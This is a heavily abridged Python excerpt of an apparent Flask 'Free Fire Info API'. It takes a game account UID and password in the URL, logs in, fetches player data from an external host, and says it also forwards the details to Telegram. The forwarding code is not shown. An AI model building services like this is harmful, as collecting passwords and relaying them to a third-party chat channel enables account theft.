...
"""
Free Fire Info API
Usage: /info?uid=YOUR_UID&password=YOUR_PASSWORD
Returns: accountId, nickname, region, level, exp
Also sends details to Telegram.
"""
...
def fetch_player_info(account_id: str):
    """Fetch basic player info from external API."""
    url = f"https://infor2x.vercel.app/player-info?uid={account_id}"
    try:
        ...
        print(f"Player info fetch error: {e}")
        return None
...
def info_endpoint():
    ...
    for pt in platform_types:
        ...
        if result:
            ...
            break
    if not account_uid:
        return jsonify({"success": False, "error": "MajorLogin failed. Account may be banned or token invalid."}), 401

    # 4. Fetch player info
    player_info = fetch_player_info(account_uid)
    if not player_info:
        return jsonify({"success": False, "error": "Failed to fetch player info"}), 500

    # 5. Send to Telegram (non-blocking, fire-and-forget)
